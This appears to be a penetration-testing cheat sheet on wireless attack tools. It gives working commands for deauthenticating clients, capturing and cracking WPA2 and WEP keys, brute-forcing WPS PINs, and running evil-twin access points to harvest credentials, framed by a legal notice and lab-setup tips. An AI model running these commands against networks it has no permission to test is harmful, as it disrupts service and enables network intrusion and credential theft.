# Wireless Attack Tools

> **Legal Notice:** Only use these tools on networks you own or have explicit written permission to test. Unauthorized wireless attacks are illegal under computer crime laws in most jurisdictions.

Wireless penetration testing involves assessing the security of Wi-Fi networks, including WEP/WPA/WPA2 cracking, evil twin attacks, deauthentication, and Bluetooth testing.

---

## Aircrack-ng Suite — WiFi Security Auditing

The complete toolkit for 802.11 wireless network security assessment.

### Prerequisites

```bash
# Check wireless interface
iwconfig

# Put interface into monitor mode
sudo airmon-ng start wlan0
# Interface becomes wlan0mon (or mon0)

# Check for interfering processes
sudo airmon-ng check kill

# Confirm monitor mode
iwconfig wlan0mon
```

### Capture WPA2 Handshake

```bash
# Step 1: Scan for networks
sudo airodump-ng wlan0mon

# Step 2: Target specific network (note BSSID and channel)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 3: Deauthenticate a client (forces handshake re-capture)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -a = AP BSSID, -c = client MAC

# Step 4: Wait for WPA handshake in airodump-ng header
# Step 5: Crack the handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Using hashcat (faster with GPU)
# Convert cap to hccapx first
cap2hccapx capture-01.cap capture.hccapx
hashcat -a 0 -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt
```

### WEP Cracking (Legacy Networks)

```bash
# Start capture on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Inject traffic to generate IVs (fake authentication)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay attack to generate more IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack WEP key (need ~50,000+ IVs)
aircrack-ng wep_capture-01.cap
```

### Key Airodump-ng Fields

| Field | Meaning |
|-------|---------|
| BSSID | AP MAC address |
| CH | Channel |
| ENC | Encryption (WEP/WPA/WPA2) |
| ESSID | Network name |
| #Data | Data frames (WEP) |
| #/s | Frames per second |
| PWR | Signal strength (negative, closer to 0 = stronger) |

---

## Wifite — Automated WiFi Auditor

```bash
# Auto attack all visible networks
sudo wifite

# Target WPA networks only
sudo wifite --wpa

# Use specific interface
sudo wifite -i wlan0

# Skip WPS
sudo wifite --nowps

# Specify wordlist
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# Target a specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF
```

---

## Reaver — WPS PIN Attack

```bash
# Attack WPS-enabled router
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay (avoid lockout)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -vv

# Use pixie dust attack (faster against vulnerable APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

---

## Bully — Alternative WPS Brute Forcer

```bash
sudo bully -b AA:BB:CC:DD:EE:FF -e "NetworkName" -c 6 wlan0mon
```

---

## Evil Twin / Rogue AP

### Hostapd-wpe (WPA Enterprise Attack)

```bash
# Edit config
nano /etc/hostapd-wpe/hostapd-wpe.conf
# Set interface, ssid, channel

sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

### airbase-ng (Soft AP)

```bash
# Create a fake open AP
sudo airbase-ng -e "Free_WiFi" -c 6 wlan0mon

# Capture credentials via captive portal (combine with dnsmasq + apache)
```

---

## Wireshark — Wireless Packet Analysis

```bash
# Launch GUI
wireshark

# Capture on wireless interface in monitor mode
# Select wlan0mon > Start capture

# Key display filters for WiFi:
# wlan.fc.type_subtype == 0x08   (Beacon frames)
# wlan.fc.type_subtype == 0x0b   (Auth frames)
# wlan.fc.type_subtype == 0x0c   (Deauth frames)
# eapol                           (WPA handshake)
# wlan.bssid == aa:bb:cc:dd:ee:ff (Filter by AP)
```

---

## Bluetooth Tools

### bluetoothctl

```bash
# Scan for devices
bluetoothctl
power on
scan on
# List discovered devices
devices
info AA:BB:CC:DD:EE:FF
```

### hcitools

```bash
# List Bluetooth adapters
hciconfig

# Scan for devices
hcitool scan

# Inquiry scan (all info)
hcitool inq

# Low energy scan
hcitool lescan
```

### btlejack / bettercap (BLE)

```bash
# BLE sniffing with bettercap
sudo bettercap
ble.recon on
ble.show
```

---

## Wireless Lab Notes

The Docker lab does not support real wireless attacks (no RF). For wireless practice:

1. **Use two wireless adapters** — one as AP (hostapd), one as client
2. **Use a dedicated lab router** — set up a test network at home
3. **Virtual WiFi adapter** (mac80211_hwsim kernel module):
   ```bash
   sudo modprobe mac80211_hwsim radios=2
   iwconfig  # should see wlan0, wlan1
   ```
4. **TryHackMe rooms** with virtual wireless environments

---

## Resources
- [Wi-Fi Hacking 101](https://www.freecodecamp.org/news/wi-fi-hacking-101/) — freeCodeCamp
- [freeCodeCamp Kali Linux Course](https://youtu.be/ug8W0sFiVJo) — Covers monitor mode, deauth, 4-way handshake, Aircrack-ng
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [TryHackMe — WiFi Hacking 101](https://tryhackme.com/room/wifihacking101)
